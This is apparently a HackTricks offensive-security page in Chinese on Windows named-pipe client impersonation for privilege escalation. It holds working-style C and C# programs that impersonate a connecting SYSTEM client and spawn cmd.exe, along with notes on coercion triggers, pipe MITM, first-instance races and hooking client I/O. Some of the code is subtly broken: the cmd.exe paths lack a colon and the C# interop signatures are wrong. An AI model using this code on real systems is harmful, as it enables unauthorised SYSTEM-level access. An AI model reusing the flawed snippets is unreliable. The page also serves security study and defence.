# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation 是一种本地权限提升原语，可让 named-pipe server thread 采用连接到它的 client 的 security context。实际上，能够以 SeImpersonatePrivilege 运行代码的攻击者，可以诱使特权 client（例如 SYSTEM service）连接到攻击者控制的 pipe，调用 ImpersonateNamedPipeClient，将生成的 token 复制为 primary token，然后以该 client 身份启动进程（通常为 NT AUTHORITY\SYSTEM）。<sup>[[2]](#references)</sup>

本页面重点介绍核心技术。有关诱使 SYSTEM 连接到你的 pipe 的端到端 exploit chain，请参阅下面引用的 Potato family 页面。

## TL;DR
- 创建一个 named pipe：\\.\pipe\<random> 并等待连接。
- 让特权组件连接到它（spooler/DCOM/EFSRPC/etc.）。
- 从 pipe 中至少读取一条 message，然后调用 ImpersonateNamedPipeClient。
- 从当前 thread 打开 impersonation token，调用 DuplicateTokenEx(TokenPrimary)，再使用 CreateProcessWithTokenW/CreateProcessAsUser 获取一个 SYSTEM process。<sup>[[2]](#references)</sup>

## Requirements and key APIs
- calling process/thread 通常需要的 privileges：
- SeImpersonatePrivilege，用于成功 impersonate 连接的 client，以及使用 CreateProcessWithTokenW。
- 另外，在 impersonate SYSTEM 后，可以使用 CreateProcessAsUser；此操作可能需要 SeAssignPrimaryTokenPrivilege 和 SeIncreaseQuotaPrivilege（当你 impersonate SYSTEM 时，这些权限已满足）。
- 使用的核心 APIs：<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（在 impersonation 前必须至少读取一条 message）
- ImpersonateNamedPipeClient 和 RevertToSelf
- OpenThreadToken、DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 或 CreateProcessAsUser
- Impersonation level：要在本地执行有用操作，client 必须允许 SecurityImpersonation（许多本地 RPC/named-pipe clients 的默认设置）。client 在打开 pipe 时可以使用 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 将其降低。<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
注意：
- 如果 `ImpersonateNamedPipeClient` 返回 `ERROR_CANNOT_IMPERSONATE (1368)`，请确保先从 pipe 中读取数据，并确认 client 没有限制 impersonation 为 Identification level。
- 优先使用 `DuplicateTokenEx` 配合 `SecurityImpersonation` 和 `TokenPrimary`，以创建适合创建进程的 primary token。

## .NET 快速示例
在 .NET 中，`NamedPipeServerStream` 可以通过 `RunAsClient` 执行 impersonation。完成 impersonation 后，复制 thread token 并创建进程。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## 获取 SYSTEM 连接到你的 pipe 的常见 triggers/coercions
这些技术会强制 privileged services 连接到你的 named pipe，从而让你 impersonate 它们：
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

查看详细用法和兼容性：

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

如果你只需要一个完整示例，了解如何 crafting pipe 并通过 service trigger 进行 impersonation 以 spawn SYSTEM，请参阅：

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM（ACLs、First-Instance Races、Client Hooking）

当 privileged service 与 low-privileged process 通过 `\\.\pipe\...` 通信时，应将该 pipe 视为与其他不受信任的 IPC boundary 一样处理。除了经典的 server-side impersonation 之外，弱 pipe ACLs、不安全的 creation flags 以及 client-side trust decisions 也都可能成为 local privilege escalation primitives。<sup>[[7]](#references)</sup>

### 首先 Enumerate candidate pipes
- 在 PowerShell 中快速列出 pipes：`Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` 有助于发现 instance counts 和 single-instance pipes。
- 优先关注由以 `SYSTEM` 身份运行的 services 使用的名称，尤其是 helpers、updaters、launchers 和 UI brokers。

### 通过 permissive DACLs 和 extra pipe instances 实现 MITM
- 任何能够与 privileged server 通信的 process，都已经可以 fuzz 其 protocol 并寻找 privileged verbs。<sup>[[7]](#references)</sup>
- 更值得关注的情况是，DACL 授予 pipe object `FILE_GENERIC_WRITE`/`GENERIC_WRITE`。对于 named pipes，这会隐式包含 `FILE_CREATE_PIPE_INSTANCE`（`FILE_APPEND_DATA` 共享同一个 bit），因此 attacker 可以使用相同名称创建另一个 server instance。
- 由于 instances 按 FIFO order 匹配，attacker-created instances 和 legitimate instances 可以交错出现：使用 `CreateNamedPipe` 创建 rogue instance，然后使用 `CreateFile` 打开相同的 pipe name，并等待 real client 连接到 rogue server instance。
- 结果是：无需控制原始 server process，即可 observe、modify、relay 或 desynchronize privileged IPC。

### pipe security descriptors 上的 First-instance race
- `lpSecurityAttributes` 只会在 pipe name 的第一个 instance 创建时定义 DACL。<sup>[[4]](#references)[[7]](#references)</sup>
- 如果 privileged service 启动较晚，且没有使用 `FILE_FLAG_FIRST_PIPE_INSTANCE`，attacker 可以先使用 permissive DACL 预创建该 pipe name，然后让 service 在 attacker 选择的 security context 下创建后续 instances。
- 这会将 service startup 转变为 race condition：抢到 first instance，然后利用被削弱的 ACL 连接或 MITM 后续 clients。
- 对 defenders 而言，这是 mitigation；对 attackers 而言，这是关键 review point：检查 `CreateNamedPipe(..., dwOpenMode, ...)` 是否包含 `FILE_FLAG_FIRST_PIPE_INSTANCE`。如果没有，则在 service 启动前测试 pre-creation。

### PID/signature checks 是 hardening，而不是 boundary
- 某些 products 会尝试通过检查连接 client 的 `GetNamedPipeClientProcessId`、process image path 或 Authenticode signer 来限制访问。<sup>[[7]](#references)</sup>
- 这只能在你 inject 到 legitimate client 之前提供帮助：一旦进入 trusted process，你就继承了 server 所期望的完全相同的 PID/image/signature context。
- 对于 split desktop apps，instrument low-privileged UI/helper process 通常比直接攻击 `SYSTEM` service 更容易。

### 根据 client 的 I/O model 进行 Hook
- Synchronous I/O：在 syscall 消费 buffer 之前 intercept `NtWriteFile`，并在 `NtReadFile` 返回后 inspect/patch。<sup>[[7]](#references)</sup>
- Overlapped I/O：保存 `NtReadFile` 中看到的 `OVERLAPPED`/`IoStatusBlock`，然后在 `GetOverlappedResult` 或相关 wait 完成后 inspect buffer。
- Completion ports：`GetQueuedCompletionStatus` 会到达 `NtRemoveIoCompletion`；返回的 `ApcContext` 会链接回原始 read 使用的 `OVERLAPPED`，这是定位现已填充 buffer 的正确 pivot。
- Completion routines（`ReadFileEx`）：completion callback 会作为 APC delivery。如果要 tamper returned data 或 inject synthetic replies，应 hook real completion routine；对于 custom injection，则使用单参数的 `QueueUserAPC` dispatcher 来重建该 routine 预期的 3 个 arguments。<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) 通过 injected helper DLL 代理 named-pipe traffic，并提供类似 Burp 的 editing/replay workflow。<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) 采用基于 Frida 的方法，重点 hook `NtReadFile`/`NtWriteFile` 以及上述 async/completion pivots，然后将 traffic 转发到基于 WebSocket 的 editing workflow。<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### 运行注意事项
- Named pipes 延迟较低；编辑缓冲区时长时间暂停可能导致脆弱的服务 deadlock。<sup>[[7]](#references)</sup>
- 使用 overlapped/completion-port/APC-driven 的客户端需要使用不同于简单 `ReadFile`/`WriteFile` detour 的 hooks。
- 注入受信任客户端会产生较多噪声，通常最好仅用于 exploit development、protocol reversing 或本地 lab fuzzing。

## Troubleshooting 和注意事项
- 在调用 ImpersonateNamedPipeClient 前，必须先从 pipe 中读取至少一条消息；否则会收到 ERROR_CANNOT_IMPERSONATE (1368)。<sup>[[1]](#references)</sup>
- 如果客户端使用 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 连接，服务器将无法完全 impersonate；请通过 GetTokenInformation(TokenImpersonationLevel) 检查 token 的 impersonation level。<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW 要求调用者拥有 SeImpersonatePrivilege。如果因 ERROR_PRIVILEGE_NOT_HELD (1314) 失败，请在已经 impersonate SYSTEM 后使用 CreateProcessAsUser。
- 如果对 pipe 进行 harden，请确保其 security descriptor 允许目标服务连接；默认情况下，\\.\pipe 下的 pipes 根据服务器的 DACL 进行访问控制。<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
